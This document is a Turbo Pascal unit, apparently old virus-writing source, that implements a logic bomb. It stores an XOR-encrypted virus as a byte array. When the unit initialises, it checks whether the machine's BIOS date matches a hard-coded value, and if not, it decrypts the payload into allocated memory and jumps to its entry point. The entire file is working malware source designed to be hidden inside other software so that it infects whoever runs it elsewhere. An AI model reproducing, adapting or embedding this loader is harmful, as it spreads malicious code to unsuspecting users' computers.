unit bomb;         {Logic bomb that releases a virus if you move the software}

interface          {Nothing external to this unit}

implementation

{The following constants must be set to the proper values before compiling
 this TPU}
const
  VIRSIZE          =654;                        {Size of virus to be released}
  VIRUS            :array[0..VIRSIZE-1] of byte=(121,74,209,113,228,217,200,
   48,127,169,231,22,127,114,19,249,164,149,27,
   2,22,86,109,173,142,151,117,252,138,194,241,173,131,219,236,123,107,219,
   44,184,231,188,56,212,0,241,70,135,82,39,191,197,228,132,39,184,52,206,
   136,74,47,31,190,20,8,38,67,190,55,1,77,59,59,120,59,16,212,148,200,185,
   198,87,68,224,65,188,71,130,167,197,209,228,169,42,130,208,70,62,15,172,
   115,12,98,116,214,146,109,176,55,30,8,60,245,148,49,45,108,149,136,86,
   193,14,82,5,121,126,192,129,247,180,201,126,187,33,163,204,29,156,24,
   14,254,167,147,189,184,174,182,212,141,102,33,244,61,167,208,155,167,
   236,173,211,150,34,220,218,217,93,170,65,99,115,235,0,247,72,227,123,
   19,113,64,231,232,104,187,38,27,168,162,119,230,190,61,252,90,54,10,167,
   140,97,228,223,193,123,242,189,7,91,126,191,81,255,185,233,170,239,35,
   24,72,123,193,210,73,167,239,43,13,108,119,112,16,2,234,54,169,13,247,
   214,159,11,137,32,236,233,244,75,166,232,195,101,254,72,20,100,241,247,
   154,86,84,192,46,72,52,124,156,79,125,14,250,65,250,34,233,20,190,145,
   135,186,199,241,53,215,197,209,117,4,137,36,8,203,14,104,83,174,153,208,
   91,209,174,232,119,231,113,241,101,56,222,207,24,242,40,236,6,183,206,
   44,152,14,36,34,83,199,140,1,156,73,197,84,195,151,253,169,73,81,246,
   158,243,22,46,245,85,157,110,108,164,110,240,135,167,237,124,83,173,173,
   146,196,201,106,37,71,129,151,63,137,166,6,89,80,240,140,88,160,138,11,
   116,117,159,245,129,102,199,0,86,127,109,231,233,6,125,162,135,54,104,
   158,151,28,10,245,45,110,150,187,37,189,120,76,151,155,39,99,43,254,103,
   133,93,89,131,167,67,43,29,191,139,27,246,21,246,148,130,130,172,137,
   60,53,238,216,159,208,84,39,130,25,153,59,0,195,230,37,52,205,81,32,120,
   220,148,245,239,2,6,59,145,20,237,14,149,146,252,133,18,5,206,227,250,
   193,45,129,137,84,159,159,166,69,161,242,81,190,54,185,196,58,151,49,
   116,131,19,166,16,251,188,125,116,239,126,69,113,5,3,171,73,52,114,252,
   172,226,23,133,180,69,190,59,148,152,246,44,9,249,251,196,85,39,154,184,
   74,141,91,156,79,121,140,232,172,22,130,253,253,154,120,211,102,183,145,
   113,52,246,189,138,12,199,233,67,57,57,31,74,123,94,1,25,74,188,30,73,
   83,225,24,23,202,111,209,77,29,17,234,188,171,187,138,195,16,74,142,185,
   111,155,246,10,222,90,67,166,65,103,151,65,147,84,83,241,181,231,38,11,
   237,210,112,176,194,86,75,46,208,160,98,146,171,122,236,252,220,72,196,
   218,196,215,118,238,37,97,245,147,150,141,90,115,104,90,158,253,80,176,
   198,87,159,107,240,15);


  ENTRYPT          =87;                   {Entry pt for initial call to virus}
  RAND_INIT        =10237989;                   {Used to initialize decryptor}
  SYS_DATE_CHECK   :array[0..8] of char=('0','3','/','2','5','/','9','4',#0);

type
  byte_arr         =array[0..10000] of byte;

var
  vir_ptr          :pointer;
  vp               :^byte_arr;

{This routine triggers if the system BIOS date is not the same as
 SYS_DATE_CHECK. Triggering is defined as returning a TRUE value.}
function Trigger_1:boolean;
var
  SYS_DATE         :array[0..8] of char absolute $F000:$FFF5;
  j                :byte;
begin
  Trigger_1:=false;
  for j:=0 to 8 do
    if SYS_DATE_CHECK[j]<>SYS_DATE[j] then Trigger_1:=true;
end;

{This procedure calls the virus in the allocated memory area. It does its
 job and returns to here}
procedure call_virus; assembler;
asm
  call  DWORD PTR ds:[vp]
end;


{This procedure releases the virus stored in the data array VIRUS by setting
 up a segment for it, decrypting it into that segment, and executing it.}
procedure Release_Virus;
var
  w                :array[0..1] of word absolute vir_ptr;
  j                :word;
begin
  GetMem(vir_ptr,VIRSIZE+16);            {allocate memory to executable virus}
  if (w[0] div 16) * 16 = w[0] then vp:=ptr(w[1]+(w[0] div 16),0)
  else vp:=ptr(w[1]+(w[0] div 16)+1,0);  {adjust starting offset to 0}

  RandSeed:=RAND_INIT;       {put virus at offset 0 in newly allocated memory}
  for j:=0 to VIRSIZE-1 do vp^[j]:=VIRUS[j] xor Random(256);
  vp:=ptr(seg(vp^),ENTRYPT);
  call_virus;
  Dispose(vir_ptr);                              {dispose of allocated memory}
end;

begin
  if Trigger_1 then Release_Virus;
end.
